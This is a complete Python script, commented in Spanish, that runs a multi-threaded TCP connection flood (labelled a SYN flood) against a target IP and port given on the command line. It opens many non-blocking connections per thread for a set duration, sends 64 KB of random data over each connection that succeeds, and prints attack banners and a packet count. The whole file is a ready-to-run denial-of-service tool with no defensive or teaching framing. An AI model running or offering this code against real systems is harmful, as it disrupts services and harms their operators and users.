import socket
import random
import sys
import time
import threading
import os
import select

class TCPSynFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.total_packets = 0
        self.lock = threading.Lock()
        
    def get_cpu_count(self):
        try:
            cpus = os.cpu_count() or 4
            return cpus * 4
        except:
            return 16
    
    def tcp_syn_worker_normal(self, worker_id):
        """Worker TCP SYN sin root - conexiones rápidas"""
        end_time = time.time() + self.duration
        dst = (self.target_ip, self.target_port)
        packet_count = 0
        
        while time.time() < end_time and self.running:
            for attempt in range(500):
                if time.time() >= end_time:
                    break
                
                try:
                    # Socket rápido con non-blocking
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.settimeout(0.001)
                    sock.setblocking(False)
                    
                    # Intentar conectar (SYN enviado)
                    try:
                        sock.connect(dst)
                    except BlockingIOError:
                        pass
                    
                    # Esperar conexión o timeout
                    _, ready, _ = select.select([], [sock], [], 0.001)
                    
                    if ready:
                        # Conexión establecida, enviar datos grandes
                        data = random._urandom(65535)
                        try:
                            sock.send(data)
                            packet_count += 1
                        except:
                            pass
                    
                    sock.close()
                    
                except Exception as e:
                    continue
            
            # Actualizar contador
            with self.lock:
                self.total_packets += packet_count
            packet_count = 0
    
    def start_attack(self):
        num_threads = self.get_cpu_count()
        
        print(f"[🔥] TCP SYN FLOOD - MODO SIN ROOT")
        print(f"[🎯] Target: {self.target_ip}:{self.target_port}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[🧵] Threads: {num_threads}")
        print(f"[⚠️] Modo: Conexiones SYN reales (no spoofing)")
        
        # Iniciar workers
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.tcp_syn_worker_normal, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Esperar
        time.sleep(self.duration)
        self.running = False
        
        with self.lock:
            total = self.total_packets
        
        print(f"\n[✅] Total paquetes SYN enviados: {total:,}")

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 tcpsyn.py <ip> <port> <time>")
        print("Ejemplo: python3 tcpsyn.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    flood = TCPSynFlood(target_ip, target_port, duration)
    flood.start_attack()

if __name__ == "__main__":
    main()
